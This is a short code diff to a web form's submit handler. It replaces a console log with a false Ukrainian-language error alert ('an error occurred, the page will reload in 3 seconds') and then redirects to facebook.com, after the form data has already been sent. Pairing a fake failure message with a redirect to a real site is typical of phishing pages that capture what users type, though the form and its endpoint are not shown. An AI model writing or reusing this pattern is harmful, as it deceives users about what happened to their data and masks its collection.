@@ -41,9 +41,11 @@ function submit() {
       ...form
     })
     .then((res) => {
-      console.log(res)
+      alert('Сталася помлка, сторінка буде перезагружена через 3 секунди. Очікуйте')
+      setTimeout(() => {
+        window.location = 'https://www.facebook.com/' as any
+      }, 3000)
     })
-  console.log(form)
 }
 
 onMounted(() => {
